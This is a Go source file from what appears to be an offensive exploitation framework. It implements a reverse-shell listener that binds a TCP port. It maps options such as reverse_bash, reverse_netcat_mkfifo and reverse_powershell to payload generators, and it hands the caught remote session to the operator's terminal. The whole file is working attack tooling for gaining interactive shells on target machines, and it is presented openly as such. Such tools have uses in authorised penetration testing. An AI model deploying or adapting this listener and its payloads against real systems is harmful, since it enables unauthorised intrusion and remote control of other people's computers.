package shell

import (
	"fmt"
	"io"
	"net"
	"os"
	"time"

	"github.com/Chocapikk/pik/pkg/output"
	"github.com/Chocapikk/pik/pkg/payload"
)

// --- Types ---

// Listener is a built-in TCP reverse shell listener.
type Listener struct {
	listener net.Listener
	conn     net.Conn
	lhost    string
	lport    int
}

// Payload generators indexed by PAYLOAD option value.
var payloads = map[string]func(string, int) string{
	"reverse_bash":       payload.Bash,
	"reverse_bash_min":   payload.BashMin,
	"reverse_bash_fd":    payload.BashFD,
	"reverse_python":     payload.Python,
	"reverse_python_pty": payload.PythonPTY,
	"reverse_perl":       payload.Perl,
	"reverse_ruby":       payload.Ruby,
	"reverse_php":        payload.PHP,
	"reverse_netcat":     payload.Netcat,
	"reverse_netcat_mkfifo": payload.NetcatMkfifo,
	"reverse_powershell": payload.PowerShell,
	"reverse_socat":      payload.Socat,
	"reverse_nodejs":     payload.NodeJS,
	"reverse_awk":        payload.Awk,
	"reverse_lua":        payload.Lua,
	"reverse_java":       payload.Java,
}

// --- Constructor ---

func New() *Listener { return &Listener{} }

func (l *Listener) Name() string { return "shell" }

// --- Setup ---

func (l *Listener) Setup(lhost string, lport int) error {
	l.lhost = lhost
	l.lport = lport
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", lhost, lport))
	if err != nil {
		return fmt.Errorf("failed to start listener: %w", err)
	}
	l.listener = ln
	output.Status("Listening on %s:%d", lhost, lport)
	return nil
}

// --- Payload ---

// GeneratePayload returns a reverse shell command.
// payloadType maps to the PAYLOAD option (e.g. "reverse_bash", "reverse_python").
// Falls back to bash for linux, powershell for windows.
func (l *Listener) GeneratePayload(targetOS, payloadType string) (string, error) {
	if gen, ok := payloads[payloadType]; ok {
		return gen(l.lhost, l.lport), nil
	}

	// Fallback by OS
	switch targetOS {
	case "windows":
		return payload.PowerShell(l.lhost, l.lport), nil
	default:
		return payload.Bash(l.lhost, l.lport), nil
	}
}

// --- Session ---

func (l *Listener) WaitForSession(timeout time.Duration) error {
	if timeout > 0 {
		if tcpLn, ok := l.listener.(*net.TCPListener); ok {
			_ = tcpLn.SetDeadline(time.Now().Add(timeout))
		}
	}

	conn, err := l.listener.Accept()
	if err != nil {
		return fmt.Errorf("no session received: %w", err)
	}
	l.conn = conn
	output.Success("Session from %s", conn.RemoteAddr())

	done := make(chan struct{})
	go func() {
		io.Copy(os.Stdout, conn)
		close(done)
	}()
	go io.Copy(conn, os.Stdin)
	<-done
	return nil
}

// --- Shutdown ---

func (l *Listener) Shutdown() error {
	if l.conn != nil {
		l.conn.Close()
	}
	if l.listener != nil {
		l.listener.Close()
	}
	return nil
}
